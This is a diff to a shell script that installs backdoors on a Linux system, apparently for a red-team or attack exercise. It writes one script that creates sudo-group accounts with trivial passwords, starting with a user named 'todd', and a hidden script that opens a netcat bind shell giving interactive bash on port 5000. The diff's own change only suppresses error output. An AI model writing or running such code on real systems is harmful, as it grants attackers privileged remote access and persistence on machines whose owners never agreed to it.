@@ -70,7 +70,7 @@ chmod 755 /bin/trojan.sh
 
 cat << EOF > /sbin/let_us_in_VIRUS.sh
 #!/bin/bash
-/usr/sbin/useradd -M -g sudo -p $(openssl passwd -crypt 123) todd
+/usr/sbin/useradd -M -g sudo -p $(openssl passwd -crypt 123) todd 2>/dev/null
 for i in {1..10}
 do
 /usr/sbin/useradd -M -g sudo -p \$(openssl passwd -crypt \$i) \$i &>/dev/null
@@ -81,7 +81,7 @@ chmod 755 /sbin/let_us_in_VIRUS.sh
 
 cat << EOF > /sbin/.open.up.vIrUs.sh
 #!/bin/bash
-rm /tmp/d 2>/dev/null;mkfifo /tmp/d;cat /tmp/d|/bin/bash -i 2>&1|nc -l 5000 >/tmp/d 2>/dev/null
+rm /tmp/d 2>/dev/null;mkfifo /tmp/d 2>/dev/null;cat /tmp/d|/bin/bash -i 2>&1|nc -l 5000 >/tmp/d 2>/dev/null
 EOF
 chmod 755 /sbin/.open.up.vIrUs.sh
 
